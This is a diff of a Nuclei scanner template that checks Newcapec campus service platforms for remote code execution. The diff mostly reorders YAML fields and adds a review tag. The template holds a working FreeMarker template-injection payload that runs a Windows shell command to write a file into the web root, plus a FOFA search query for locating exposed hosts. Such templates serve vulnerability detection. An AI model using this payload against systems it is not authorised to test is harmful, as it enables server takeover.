@@ -1,43 +1,51 @@
-id: newcapec-rce
-
-info:
-  name: Newcapec - Remote Code Execution
-  author: ritikchaddha
-  severity: critical
-  description: |
-    Newcapec front-end service management platform service.action interface has a remote command execution vulnerability, attackers can use the vulnerability to obtain server permissions.
-  reference: |
-    - https://forum.butian.net/article/242
-  metadata:
-    max-request: 2
-    fofa-query: title="掌上校园服务管理平台"
-  tags: newcapec,rce,intrusive
-
-variables:
-  file: "{{rand_base(5)}}"
-  data: "{{randstr}}"
-
 http:
-  - raw:
-      - |
-        @timeout: 30s
-        POST /service_transport/service.action HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/json
+- matchers:
+  - condition: and
+    dsl:
+    - status_code_1 == 200 && status_code_2 == 200
+    - contains(header_1, "text/plain") && contains(header_2, "text/plain")
+    - contains(body_1, "{\"_result\":")
+    - contains(body_2, "{{data}}")
+    type: dsl
+  raw:
+  - '@timeout: 30s
 
-        {"command":"GetFZinfo","UnitCode":"<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c echo {{data}} > ./webapps/ROOT/{{file}}.txt\")}"}
+    POST /service_transport/service.action HTTP/1.1
 
-      - |
-        GET /{{file}}.txt HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/json
+    Host: {{Hostname}}
 
-    matchers:
-      - type: dsl
-        dsl:
-          - 'status_code_1 == 200 && status_code_2 == 200'
-          - 'contains(header_1, "text/plain") && contains(header_2, "text/plain")'
-          - 'contains(body_1, "{\"_result\":")'
-          - 'contains(body_2, "{{data}}")'
-        condition: and
-# digest: 490a00463044022037c651a97eae929538d2a40e110fcea021422f222cdae81e54a3a1584fe8650f02205d73f7e9c3205bb35b245a6c7979918de0d61b9b01301e9383734e7e23277721:922c64590222798bb761d5b6d8e72950
+    Content-Type: application/json
+
+
+    {"command":"GetFZinfo","UnitCode":"<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd
+    /c echo {{data}} > ./webapps/ROOT/{{file}}.txt\")}"}
+
+    '
+  - 'GET /{{file}}.txt HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/json
+
+    '
+id: newcapec-rce
+info:
+  author: ritikchaddha
+  description: 'Newcapec front-end service management platform service.action interface
+    has a remote command execution vulnerability, attackers can use the vulnerability
+    to obtain server permissions.
+
+    '
+  metadata:
+    fofa-query: "title=\"\u638C\u4E0A\u6821\u56ED\u670D\u52A1\u7BA1\u7406\u5E73\u53F0\
+      \""
+    max-request: 2
+    runzero-review: REJECT/2025-11-07/excluding tag intrusive
+  name: Newcapec - Remote Code Execution
+  reference:
+  - https://forum.butian.net/article/242
+  severity: critical
+  tags: newcapec,rce,intrusive,vuln
+variables:
+  data: '{{randstr}}'
+  file: '{{rand_base(5)}}'
